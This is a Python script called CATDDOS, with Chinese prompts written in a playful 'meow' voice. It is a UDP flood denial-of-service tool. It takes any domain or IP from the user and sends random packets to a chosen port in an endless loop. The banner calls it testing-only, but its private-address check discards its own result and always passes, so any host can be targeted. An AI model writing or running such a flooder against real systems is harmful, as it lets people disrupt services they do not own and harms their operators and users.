#python

import socket
import time
import sys
import os

from datetime import datetime
_t0 = time.perf_counter()

os.system("clear")
os.system("figlet CATDDOS")

text="""
========================================                   Name:CATDDOS   Author: 11jianfeng
(｡◝ᴗ◜｡) 
小提示:出了什么事不要找我喵，请你自己自行解决!!!
（ '▿ ' ）                                                 这个脚本适用于LINUX以及Termux(这个就是在这个上面编写的喵)
!!!这个只能用来测试!!!(我还不想牢底坐穿)_(•̀ω•́ 」∠)_
========================================                   """
print (" ")
print("\033[5;31m%s\033[0m\n" % text)
A='开始了喵!出什么事我不管喵!!!'

def resolve_ip(domain: str) -> str:
    """返回域名对应的首个 IPv4 地址"""
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except socket.gaierror as e:
        print(f"[ERROR] 域名解析失败: {e}")
        sys.exit(1)

def self_check_ip(ip: str) -> bool:
    private = (
        ip.startswith("127.") or
        ip.startswith("192.168.") or
        ip.startswith("10.") or
        (ip.startswith("172.") and 16 <= int(ip.split('.')[1]) <= 31)
    )
    return True

current_time = datetime.now()
print(f"当前时间为：{current_time}")


def udp_flood(target_ip: str, target_port: int, packet_size: int, mbps: float):
    """速率受限的 UDP 发送"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rate_bytes_per_sec = (mbps * 1_000_000) / 8
    interval = packet_size / rate_bytes_per_sec
    pkt = os.urandom(packet_size)
    count = 0
    print("\033[5;31m%s\033[0m\n" % A)
    print(f"[INFO] 开始发送 {mbps} Mbps 流量到 {target_ip}:{target_port} 按 Ctrl-C 停止喵~")
    try:
        while True:
            sock.sendto(pkt, (target_ip, target_port))
            count += 1
            time.sleep(interval)   # 粗略限速
            if count % 1000 == 0:
                print(f"[INFO] 已发 {count} 包喵", end="\r")
    except KeyboardInterrupt:
        print(f"\n[INFO] 用户中断，共发送 {count} 包，总耗时: {time.perf_counter() - _t0:.3f} 秒喵")
    finally:
        sock.close()

def main():
    if len(sys.argv) > 1:
        domain = sys.argv[1]
    else:
        domain = input("请输入目标域名或 IP: ").strip()
    target_port = int(input("目标端口 (1-65535): ").strip())
    packet_size = int(input("每包字节数 (64-640400): ").strip())
    mbps = float(input("限速 Mbps (建议 ≤50): ").strip() or "5")

    if not (64 <= packet_size <= 64000):
        print("包大小超出范围（▼へ▼メ）")
        sys.exit(1)

    ip = resolve_ip(domain)
    print(f"[INF0] 解析到 IP: {ip}")
    self_check_ip(ip)

    udp_flood(ip, target_port, packet_size, mbps)

if __name__ == "__main__":
    main()
